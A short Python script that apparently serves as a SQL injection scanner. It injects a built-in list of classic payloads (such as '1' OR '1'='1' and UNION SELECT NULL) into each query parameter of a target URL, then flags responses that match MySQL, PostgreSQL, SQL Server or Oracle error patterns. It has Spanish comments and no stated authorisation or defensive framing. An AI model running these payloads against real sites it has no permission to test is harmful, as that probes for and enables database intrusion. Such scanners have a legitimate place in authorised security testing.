import requests
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
from typing import List, Dict
import re

SQL_PAYLOADS = [
    "'", "1' OR '1'='1", "1' OR '1'='1' --", "admin' --",
    "' or 1=1--", "') or '1'='1--", "1' UNION SELECT NULL--",
]

ERROR_PATTERNS = [
    r"SQL syntax.*MySQL", r"Warning.*mysql_", r"PostgreSQL.*ERROR",
    r"Microsoft SQL", r"OLE DB.*SQL Server", r"Oracle error",
]

class SQLInjectionTester:
    def __init__(self, target: str):
        self.target = target
        self.vulnerabilities = []
        
    def test_url(self, url: str, timeout: int = 10) -> List[Dict]:
        results = []
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        
        if not params:
            return results
        
        try:
            base_response = requests.get(url, timeout=timeout)
            base_length = len(base_response.text)
        except:
            return results
        
        for param_name in params.keys():
            for payload in SQL_PAYLOADS:
                test_params = params.copy()
                test_params[param_name] = [payload]
                test_query = urlencode(test_params, doseq=True)
                test_url = urlunparse((parsed.scheme, parsed.netloc, parsed.path,
                                      parsed.params, test_query, parsed.fragment))
                
                try:
                    response = requests.get(test_url, timeout=timeout)
                    
                    # Buscar errores SQL
                    for pattern in ERROR_PATTERNS:
                        if re.search(pattern, response.text, re.IGNORECASE):
                            results.append({
                                'type': 'SQL Injection - Error Based',
                                'parameter': param_name,
                                'payload': payload,
                                'url': test_url,
                                'severity': 'HIGH'
                            })
                            print(f"[!] SQLi encontrada en parámetro: {param_name}")
                            break
                except:
                    pass
        
        return results

def test(target: str, urls: List[str] = None) -> Dict:
    tester = SQLInjectionTester(target)
    results = []
    
    if not urls:
        urls = [f"http://{target}", f"https://{target}"]
    
    for url in urls:
        results.extend(tester.test_url(url))
    
    print(f"\n[+] Total SQLi vulnerabilities: {len(results)}")
    return {'target': target, 'vulnerabilities': results}